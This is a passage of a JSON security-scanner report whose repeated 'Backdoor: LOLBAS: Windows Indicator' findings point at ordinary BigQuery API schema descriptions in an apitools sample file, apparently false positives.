          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 828,
                  "startColumn": 603,
                  "endLine": 828,
                  "endColumn": 611,
                  "snippet": {
                    "text": "e. WRITE_EMPTY: If the table already exists and contains data, a 'duplicate' error is returned in the job result. The default value is WRITE_APPEND. Each action is atomic and only occurs if BigQuery is able to complete the job successfully. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    }\n   }\n  },\n  \"JobConfigurationQuery\": {\n   \"id\": \"JobConfigurationQuery\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"allowLargeResults\": {\n     \"type\": \"boolean\",\n     \"description\": \"If true, allows the query to produce arbitrarily large result tables at a slight cost i",
                    "rendered": {
                      "text": "e. WRITE_EMPTY: If the table already exists and contains data, a 'duplicate' error is returned in the job result. The default value is WRITE_APPEND. Each action is atomic and only occurs if BigQuery is able to complete the job successfully. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    }\n   }\n  },\n  \"JobConfigurationQuery\": {\n   \"id\": \"JobConfigurationQuery\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"allowLargeResults\": {\n     \"type\": \"boolean\",\n     \"description\": \"If true, allows the query to produce arbitrarily large result tables at a slight cost i",
                      "markdown": "`e. WRITE_EMPTY: If the table already exists and contains data, a 'duplicate' error is returned in the job result. The default value is WRITE_APPEND. Each action is atomic and only occurs if BigQuery is able to complete the job successfully. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    }\n   }\n  },\n  \"JobConfigurationQuery\": {\n   \"id\": \"JobConfigurationQuery\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"allowLargeResults\": {\n     \"type\": \"boolean\",\n     \"description\": \"If true, allows the query to produce arbitrarily large result tables at a slight cost i`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 812,
                  "startColumn": 50,
                  "endLine": 812,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    },\n    \"skipLeadingRows\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when loading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int32\"\n    },\n    \"sourceFormat\": {\n",
                    "rendered": {
                      "text": "    },\n    \"skipLeadingRows\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when loading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int32\"\n    },\n    \"sourceFormat\": {\n",
                      "markdown": "`    },\n    \"skipLeadingRows\": {\n     \"type\": \"integer\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when loading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int32\"\n    },\n    \"sourceFormat\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 805,
                  "startColumn": 134,
                  "endLine": 805,
                  "endColumn": 142,
                  "snippet": {
                    "text": "rmat\": {\n     \"type\": \"string\",\n     \"description\": \"[Deprecated] The format of the schemaInline property.\"\n    },\n    \"schemaUpdateOptions\": {\n     \"type\": \"array\",\n     \"description\": \"[Experimental] Allows the schema of the desitination table to be updated as a side effect of the load job. Schema update options are supported in two cases: when writeDisposition is WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the destination table is a partition of a table, specified by partition decorators. For normal tables, WRITE_TRUNCATE will always overwrite the schema. One or more of the following ",
                    "rendered": {
                      "text": "rmat\": {\n     \"type\": \"string\",\n     \"description\": \"[Deprecated] The format of the schemaInline property.\"\n    },\n    \"schemaUpdateOptions\": {\n     \"type\": \"array\",\n     \"description\": \"[Experimental] Allows the schema of the desitination table to be updated as a side effect of the load job. Schema update options are supported in two cases: when writeDisposition is WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the destination table is a partition of a table, specified by partition decorators. For normal tables, WRITE_TRUNCATE will always overwrite the schema. One or more of the following ",
                      "markdown": "`rmat\": {\n     \"type\": \"string\",\n     \"description\": \"[Deprecated] The format of the schemaInline property.\"\n    },\n    \"schemaUpdateOptions\": {\n     \"type\": \"array\",\n     \"description\": \"[Experimental] Allows the schema of the desitination table to be updated as a side effect of the load job. Schema update options are supported in two cases: when writeDisposition is WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the destination table is a partition of a table, specified by partition decorators. For normal tables, WRITE_TRUNCATE will always overwrite the schema. One or more of the following `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 755,
                  "startColumn": 410,
                  "endLine": 755,
                  "endColumn": 418,
                  "snippet": {
                    "text": "    },\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The following values are supported: CREATE_IF_NEEDED: If the table does not exist, BigQuery creates the table. CREATE_NEVER: The table must already exist. If it does not, a 'notFound' error is returned in the job result. The default value is CREATE_IF_NEEDED. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    },\n    \"destinationTable\": {\n     \"$ref\": \"TableReference\",\n",
                    "rendered": {
                      "text": "    },\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The following values are supported: CREATE_IF_NEEDED: If the table does not exist, BigQuery creates the table. CREATE_NEVER: The table must already exist. If it does not, a 'notFound' error is returned in the job result. The default value is CREATE_IF_NEEDED. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    },\n    \"destinationTable\": {\n     \"$ref\": \"TableReference\",\n",
                      "markdown": "`    },\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The following values are supported: CREATE_IF_NEEDED: If the table does not exist, BigQuery creates the table. CREATE_NEVER: The table must already exist. If it does not, a 'notFound' error is returned in the job result. The default value is CREATE_IF_NEEDED. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    },\n    \"destinationTable\": {\n     \"$ref\": \"TableReference\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 610,
                  "startColumn": 50,
                  "endLine": 610,
                  "endColumn": 54,
                  "snippet": {
                    "text": "results. Present only when the query completes successfully.\",\n     \"format\": \"uint64\"\n    }\n   }\n  },\n  \"GoogleSheetsOptions\": {\n   \"id\": \"GoogleSheetsOptions\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a sheet that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows that should be skipped. When autodetect is on, behavior is the following: * skipLeadingRows unspecified - Autodetect tries to detect headers in the first row. If ",
                    "rendered": {
                      "text": "results. Present only when the query completes successfully.\",\n     \"format\": \"uint64\"\n    }\n   }\n  },\n  \"GoogleSheetsOptions\": {\n   \"id\": \"GoogleSheetsOptions\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a sheet that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows that should be skipped. When autodetect is on, behavior is the following: * skipLeadingRows unspecified - Autodetect tries to detect headers in the first row. If ",
                      "markdown": "`results. Present only when the query completes successfully.\",\n     \"format\": \"uint64\"\n    }\n   }\n  },\n  \"GoogleSheetsOptions\": {\n   \"id\": \"GoogleSheetsOptions\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a sheet that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows that should be skipped. When autodetect is on, behavior is the following: * skipLeadingRows unspecified - Autodetect tries to detect headers in the first row. If `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 574,
                  "startColumn": 136,
                  "endLine": 574,
                  "endColumn": 144,
                  "snippet": {
                    "text": "    },\n    \"numDmlAffectedRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only, Experimental] The number of rows affected by a DML statement. Present only for DML statements INSERT, UPDATE or DELETE.\",\n     \"format\": \"int64\"\n    },\n    \"pageToken\": {\n",
                    "rendered": {
                      "text": "    },\n    \"numDmlAffectedRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only, Experimental] The number of rows affected by a DML statement. Present only for DML statements INSERT, UPDATE or DELETE.\",\n     \"format\": \"int64\"\n    },\n    \"pageToken\": {\n",
                      "markdown": "`    },\n    \"numDmlAffectedRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only, Experimental] The number of rows affected by a DML statement. Present only for DML statements INSERT, UPDATE or DELETE.\",\n     \"format\": \"int64\"\n    },\n    \"pageToken\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 299,
                  "startColumn": 118,
                  "endLine": 299,
                  "endColumn": 126,
                  "snippet": {
                    "text": "    },\n    \"selfLink\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] A URL that can be used to access the resource again. You can use this URL in Get or Update requests to the resource.\"\n    }\n   }\n  },\n",
                    "rendered": {
                      "text": "    },\n    \"selfLink\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] A URL that can be used to access the resource again. You can use this URL in Get or Update requests to the resource.\"\n    }\n   }\n  },\n",
                      "markdown": "`    },\n    \"selfLink\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] A URL that can be used to access the resource again. You can use this URL in Get or Update requests to the resource.\"\n    }\n   }\n  },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 241,
                  "startColumn": 314,
                  "endLine": 241,
                  "endColumn": 322,
                  "snippet": {
                    "text": "       },\n       \"view\": {\n        \"$ref\": \"TableReference\",\n        \"description\": \"[Pick one] A view from a different dataset to grant access to. Queries executed against that view will have read access to tables in this dataset. The role field is not required when this field is set. If that view is updated by any user, access to the view needs to be granted again via an update operation.\"\n       }\n      }\n     }\n",
                    "rendered": {
                      "text": "       },\n       \"view\": {\n        \"$ref\": \"TableReference\",\n        \"description\": \"[Pick one] A view from a different dataset to grant access to. Queries executed against that view will have read access to tables in this dataset. The role field is not required when this field is set. If that view is updated by any user, access to the view needs to be granted again via an update operation.\"\n       }\n      }\n     }\n",
                      "markdown": "`       },\n       \"view\": {\n        \"$ref\": \"TableReference\",\n        \"description\": \"[Pick one] A view from a different dataset to grant access to. Queries executed against that view will have read access to tables in this dataset. The role field is not required when this field is set. If that view is updated by any user, access to the view needs to be granted again via an update operation.\"\n       }\n      }\n     }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 215,
                  "startColumn": 237,
                  "endLine": 215,
                  "endColumn": 241,
                  "snippet": {
                    "text": "ect\",\n   \"properties\": {\n    \"access\": {\n     \"type\": \"array\",\n     \"description\": \"[Optional] An array of objects that define dataset access for one or more entities. You can set this property when inserting or updating a dataset in order to control who is allowed to access the data. If unspecified at dataset creation time, BigQuery adds default dataset access for the following entities: access.specialGroup: projectReaders; access.role: READER; access.specialGroup: projectWriters; access.role: WRITER; access.specialGroup: projectOwners; access.role: OWNER; access.userByEmail: [dataset creator ema",
                    "rendered": {
                      "text": "ect\",\n   \"properties\": {\n    \"access\": {\n     \"type\": \"array\",\n     \"description\": \"[Optional] An array of objects that define dataset access for one or more entities. You can set this property when inserting or updating a dataset in order to control who is allowed to access the data. If unspecified at dataset creation time, BigQuery adds default dataset access for the following entities: access.specialGroup: projectReaders; access.role: READER; access.specialGroup: projectWriters; access.role: WRITER; access.specialGroup: projectOwners; access.role: OWNER; access.userByEmail: [dataset creator ema",
                      "markdown": "`ect\",\n   \"properties\": {\n    \"access\": {\n     \"type\": \"array\",\n     \"description\": \"[Optional] An array of objects that define dataset access for one or more entities. You can set this property when inserting or updating a dataset in order to control who is allowed to access the data. If unspecified at dataset creation time, BigQuery adds default dataset access for the following entities: access.specialGroup: projectReaders; access.role: READER; access.specialGroup: projectWriters; access.role: WRITER; access.specialGroup: projectOwners; access.role: OWNER; access.userByEmail: [dataset creator ema`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 215,
                  "startColumn": 179,
                  "endLine": 215,
                  "endColumn": 188,
                  "snippet": {
                    "text": " }\n  },\n  \"Dataset\": {\n   \"id\": \"Dataset\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"access\": {\n     \"type\": \"array\",\n     \"description\": \"[Optional] An array of objects that define dataset access for one or more entities. You can set this property when inserting or updating a dataset in order to control who is allowed to access the data. If unspecified at dataset creation time, BigQuery adds default dataset access for the following entities: access.specialGroup: projectReaders; access.role: READER; access.specialGroup: projectWriters; access.role: WRITER; access.specialGroup: projectOwners; access.",
                    "rendered": {
                      "text": " }\n  },\n  \"Dataset\": {\n   \"id\": \"Dataset\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"access\": {\n     \"type\": \"array\",\n     \"description\": \"[Optional] An array of objects that define dataset access for one or more entities. You can set this property when inserting or updating a dataset in order to control who is allowed to access the data. If unspecified at dataset creation time, BigQuery adds default dataset access for the following entities: access.specialGroup: projectReaders; access.role: READER; access.specialGroup: projectWriters; access.role: WRITER; access.specialGroup: projectOwners; access.",
                      "markdown": "` }\n  },\n  \"Dataset\": {\n   \"id\": \"Dataset\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"access\": {\n     \"type\": \"array\",\n     \"description\": \"[Optional] An array of objects that define dataset access for one or more entities. You can set this property when inserting or updating a dataset in order to control who is allowed to access the data. If unspecified at dataset creation time, BigQuery adds default dataset access for the following entities: access.specialGroup: projectReaders; access.role: READER; access.specialGroup: projectWriters; access.role: WRITER; access.specialGroup: projectOwners; access.`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 204,
                  "startColumn": 50,
                  "endLine": 204,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    },\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int64\"\n    }\n   }\n",
                    "rendered": {
                      "text": "    },\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int64\"\n    }\n   }\n",
                      "markdown": "`    },\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int64\"\n    }\n   }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 431,
                  "endLine": 122,
                  "endColumn": 435,
                  "snippet": {
                    "text": "    },\n    \"type\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The type to convert the value in cells of this column. The values are expected to be encoded using HBase Bytes.toBytes function when using the BINARY encoding value. Following BigQuery types are allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default type is BYTES. 'type' can also be set at the column family level. However, the setting at this level takes precedence if 'type' is set at both levels.\"\n    }\n   }\n  },\n",
                    "rendered": {
                      "text": "    },\n    \"type\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The type to convert the value in cells of this column. The values are expected to be encoded using HBase Bytes.toBytes function when using the BINARY encoding value. Following BigQuery types are allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default type is BYTES. 'type' can also be set at the column family level. However, the setting at this level takes precedence if 'type' is set at both levels.\"\n    }\n   }\n  },\n",
                      "markdown": "`    },\n    \"type\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The type to convert the value in cells of this column. The values are expected to be encoded using HBase Bytes.toBytes function when using the BINARY encoding value. Following BigQuery types are allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default type is BYTES. 'type' can also be set at the column family level. However, the setting at this level takes precedence if 'type' is set at both levels.\"\n    }\n   }\n  },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 383,
                  "endLine": 122,
                  "endColumn": 387,
                  "snippet": {
                    "text": "    },\n    \"type\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The type to convert the value in cells of this column. The values are expected to be encoded using HBase Bytes.toBytes function when using the BINARY encoding value. Following BigQuery types are allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default type is BYTES. 'type' can also be set at the column family level. However, the setting at this level takes precedence if 'type' is set at both levels.\"\n    }\n   }\n  },\n",
                    "rendered": {
                      "text": "    },\n    \"type\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The type to convert the value in cells of this column. The values are expected to be encoded using HBase Bytes.toBytes function when using the BINARY encoding value. Following BigQuery types are allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default type is BYTES. 'type' can also be set at the column family level. However, the setting at this level takes precedence if 'type' is set at both levels.\"\n    }\n   }\n  },\n",
                      "markdown": "`    },\n    \"type\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The type to convert the value in cells of this column. The values are expected to be encoded using HBase Bytes.toBytes function when using the BINARY encoding value. Following BigQuery types are allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default type is BYTES. 'type' can also be set at the column family level. However, the setting at this level takes precedence if 'type' is set at both levels.\"\n    }\n   }\n  },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 334,
                  "endLine": 122,
                  "endColumn": 338,
                  "snippet": {
                    "text": "    },\n    \"type\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The type to convert the value in cells of this column. The values are expected to be encoded using HBase Bytes.toBytes function when using the BINARY encoding value. Following BigQuery types are allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default type is BYTES. 'type' can also be set at the column family level. However, the setting at this level takes precedence if 'type' is set at both levels.\"\n    }\n   }\n  },\n",
                    "rendered": {
                      "text": "    },\n    \"type\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The type to convert the value in cells of this column. The values are expected to be encoded using HBase Bytes.toBytes function when using the BINARY encoding value. Following BigQuery types are allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default type is BYTES. 'type' can also be set at the column family level. However, the setting at this level takes precedence if 'type' is set at both levels.\"\n    }\n   }\n  },\n",
                      "markdown": "`    },\n    \"type\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The type to convert the value in cells of this column. The values are expected to be encoded using HBase Bytes.toBytes function when using the BINARY encoding value. Following BigQuery types are allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default type is BYTES. 'type' can also be set at the column family level. However, the setting at this level takes precedence if 'type' is set at both levels.\"\n    }\n   }\n  },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 248,
                  "endLine": 110,
                  "endColumn": 252,
                  "snippet": {
                    "text": "    },\n    \"onlyReadLatest\": {\n     \"type\": \"boolean\",\n     \"description\": \"[Optional] If this is set, only the latest version of value in this column are exposed. 'onlyReadLatest' can also be set at the column family level. However, the setting at this level takes precedence if 'onlyReadLatest' is set at both levels.\"\n    },\n    \"qualifierEncoded\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "    },\n    \"onlyReadLatest\": {\n     \"type\": \"boolean\",\n     \"description\": \"[Optional] If this is set, only the latest version of value in this column are exposed. 'onlyReadLatest' can also be set at the column family level. However, the setting at this level takes precedence if 'onlyReadLatest' is set at both levels.\"\n    },\n    \"qualifierEncoded\": {\n     \"type\": \"string\",\n",
                      "markdown": "`    },\n    \"onlyReadLatest\": {\n     \"type\": \"boolean\",\n     \"description\": \"[Optional] If this is set, only the latest version of value in this column are exposed. 'onlyReadLatest' can also be set at the column family level. However, the setting at this level takes precedence if 'onlyReadLatest' is set at both levels.\"\n    },\n    \"qualifierEncoded\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 190,
                  "endLine": 110,
                  "endColumn": 194,
                  "snippet": {
                    "text": "    },\n    \"onlyReadLatest\": {\n     \"type\": \"boolean\",\n     \"description\": \"[Optional] If this is set, only the latest version of value in this column are exposed. 'onlyReadLatest' can also be set at the column family level. However, the setting at this level takes precedence if 'onlyReadLatest' is set at both levels.\"\n    },\n    \"qualifierEncoded\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "    },\n    \"onlyReadLatest\": {\n     \"type\": \"boolean\",\n     \"description\": \"[Optional] If this is set, only the latest version of value in this column are exposed. 'onlyReadLatest' can also be set at the column family level. However, the setting at this level takes precedence if 'onlyReadLatest' is set at both levels.\"\n    },\n    \"qualifierEncoded\": {\n     \"type\": \"string\",\n",
                      "markdown": "`    },\n    \"onlyReadLatest\": {\n     \"type\": \"boolean\",\n     \"description\": \"[Optional] If this is set, only the latest version of value in this column are exposed. 'onlyReadLatest' can also be set at the column family level. However, the setting at this level takes precedence if 'onlyReadLatest' is set at both levels.\"\n    },\n    \"qualifierEncoded\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 141,
                  "endLine": 110,
                  "endColumn": 145,
                  "snippet": {
                    "text": "    },\n    \"onlyReadLatest\": {\n     \"type\": \"boolean\",\n     \"description\": \"[Optional] If this is set, only the latest version of value in this column are exposed. 'onlyReadLatest' can also be set at the column family level. However, the setting at this level takes precedence if 'onlyReadLatest' is set at both levels.\"\n    },\n    \"qualifierEncoded\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "    },\n    \"onlyReadLatest\": {\n     \"type\": \"boolean\",\n     \"description\": \"[Optional] If this is set, only the latest version of value in this column are exposed. 'onlyReadLatest' can also be set at the column family level. However, the setting at this level takes precedence if 'onlyReadLatest' is set at both levels.\"\n    },\n    \"qualifierEncoded\": {\n     \"type\": \"string\",\n",
                      "markdown": "`    },\n    \"onlyReadLatest\": {\n     \"type\": \"boolean\",\n     \"description\": \"[Optional] If this is set, only the latest version of value in this column are exposed. 'onlyReadLatest' can also be set at the column family level. However, the setting at this level takes precedence if 'onlyReadLatest' is set at both levels.\"\n    },\n    \"qualifierEncoded\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
